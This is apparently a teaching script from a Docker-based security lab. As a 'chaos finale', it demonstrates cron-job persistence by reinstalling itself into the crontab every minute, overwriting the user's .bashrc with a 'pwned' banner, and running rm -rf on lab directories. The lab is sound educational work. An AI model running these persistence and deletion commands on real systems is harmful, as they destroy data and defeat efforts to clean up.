#!/bin/bash
# =====================================================================
#  OPTIONAL "CHAOS" FINALE
#  ---------------------------------------------------------------
#  DO NOT RUN THIS UNTIL YOU HAVE FINISHED THE ENTIRE TUTORIAL.
#
#  This deliberately trashes the lab to show how destructive - and how
#  STUBBORN - a persistent cron job can be. It is completely sealed
#  inside the container and CANNOT touch your real computer.
#
#  To put everything back to normal:
#      docker compose down && docker compose up -d --build
# =====================================================================

LOG=/var/log/cron-lab.log

# 1) PERSISTENCE: reinstall itself into the current user's crontab on every
#    run. Even if you delete the job, it reappears a minute later - just like
#    the real attack. This is the whole point of the gag.
( crontab -l 2>/dev/null | grep -v 'chaos.sh' ; echo '* * * * * /opt/lab/chaos.sh' ) | crontab - 2>/dev/null

# 2) TAKEOVER: rewrite the shell so every new terminal greets you with a
#    "pwned" skull and a defaced prompt.
cat > "$HOME/.bashrc" <<'EOF'
cat <<'SKULL'
       ______
    .-"      "-.
   /            \
  |              |
  |,  .-.  .-.  ,|      Y O U ' V E   B E E N   P W N E D
  | )(_o/  \o_)( |
  |/     /\     \|      a cron job owns this box now -
  (_     ^^     _)       and it will not let go.
   \__|IIIIII|__/
    | \IIIIII/ |
    \          /
     `--------`
SKULL
PS1='\[\e[31m\]pwned:\w\$ \[\e[0m\]'
EOF

# 3) "DESTRUCTION": wipe the lab's files. Scoped to the container's lab
#    directories on purpose - the drama of a full wipe, without leaving the
#    box in a weird half-broken state.
echo "[$(date '+%H:%M:%S')] (chaos) wiping the box... everything is going away" >> "$LOG"
rm -rf "$HOME/company_data" /opt/lab/payloads /tmp/miner.sh 2>/dev/null

cat <<'BANNER'

   >>> The attacker's cron job just trashed the lab. <<<
   Try to clean up - delete the job, delete the files. It will all come
   back within a minute, because the cron job keeps reinstalling itself.
   THIS is why persistence makes real incidents so painful.

   When you are done, reset everything with:
       docker compose down && docker compose up -d --build

BANNER
